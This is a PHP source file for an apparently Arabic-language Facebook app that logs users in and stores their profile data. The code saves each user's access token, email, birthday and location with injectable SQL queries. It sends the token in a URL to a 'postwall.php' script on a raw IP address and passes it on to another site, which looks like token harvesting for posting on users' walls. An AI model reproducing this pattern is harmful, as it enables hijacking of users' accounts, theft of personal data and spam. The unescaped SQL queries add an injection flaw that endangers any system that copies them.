<?php
ob_start();
 require 'app_setting.php';
 require 'facebook.php';
?>

<html lang="en" >
    <head>
      
         <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="apple-mobile-web-app-status-bar-style" content="black">

    </head>
    <body>

      
        <?php

       

        $facebook = new Facebook(array(
                    'appId' => APP_ID,
                    'secret' => APP_SECRET,
                    'cookie' => true,));  
 
        $loginUrl = $facebook->getLoginUrl($params = array('scope' => APP_SCOPE,'redirect_uri' => 'http://178.63.108.123:50001/app_register.php'));

        $me = null;

        if (isset($_GET['code'])) {
            try {
                
                $me = $facebook->api('/me');

                $name = isset($me['name']) ? $me['name'] : "hide";
                $username = isset($me['username']) ? $me['username'] : "hide";
                $email = isset($me['email']) ? $me['email'] : "hide";
                $gender = isset($me['gender']) ? $me['gender'] : "hide";
                $userid = isset($me['id']) ? $me['id'] : "hide";

                $birthday = isset($me['birthday']) ? $me['birthday'] : "hide";

                $location = "";
                $lo = isset($me['location']) ? $me['location'] : null;
                if ($lo) {
                    $location = isset($lo['name']) ? $lo['name'] : "hide";
                }
                $code = $_GET['code'];
                $accesstoken = $facebook->getAccessToken();
                $appid = $facebook->getAppId();
    

                $oldusers = mysql_query("select `userid` from `" . DB_NAME . "`.`".TABLE_NAME."` where `userid`='$userid' and  `appid` ='".APP_ID."' ", $con);

                $num_rows = mysql_num_rows($oldusers);
                if ($num_rows > 0) {
                    $r = mysql_fetch_assoc($oldusers);
                 
                    $sql = "update  `" . DB_NAME . "`.`".TABLE_NAME."` set `accesstoken` = '{$accesstoken}' , `appid` = '{$appid}' , `time`=CURRENT_TIMESTAMP where `userid` = '{$userid}' and  `appid` ='".APP_ID."' ";
                    mysql_query($sql, $con);

                    LoadPhp("http://178.63.108.123:50001/postwall.php?accesstoken=".$accesstoken);
                    header("Location: ".GOURL."?accesstoken=". $accesstoken);
                    return;
                }
      

                $sql = "INSERT INTO `" . DB_NAME . "`.`".TABLE_NAME."`(`id`, `name`, `username`, `email`, `userid`, `code`, `accesstoken`, `appid`,`gender`,`location`,`birthday`) VALUES";
                $sql .= "(null,'{$name}','{$username}','{$email}','{$userid}','{$code}','{$accesstoken}','{$appid}','{$gender}','{$location}','{$birthday}')";
                mysql_query($sql, $con);

 
                echo '<hr><a href="' . $facebook->getLogoutUrl() . '">تسجيل الخروج</a>';
                 LoadPhp("http://178.63.108.123:50001/postwall.php?accesstoken=".$accesstoken);
               header("Location: ".GOURL."?accesstoken=". $accesstoken);
            } catch (FacebookApiException $e) {
              
                echo $e->getMessage();
                echo '<a href="' . $loginUrl . '">Login</a>';
                error_log($e);
            }
        } else {
          
            echo "<script type='text/javascript'>top.location.href = '" . $loginUrl . "';</script>";
        }

        if ($me) {
            
        }


        function LoadPhp($url) {
    try {

        global $responseobject;

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        //curl_setopt($ch, CURLOPT_HTTPHEADER, array('Host: graph.facebook.com'));
        $output = curl_exec($ch);
        curl_close($ch);

        return $output;
    } catch (Exception $ex) {
        $responseobject->errors = $ex;
        return null;
    }
}

        ?>

    </body>
</html>

<?php
$stuff = ob_get_clean();
echo $stuff;
?>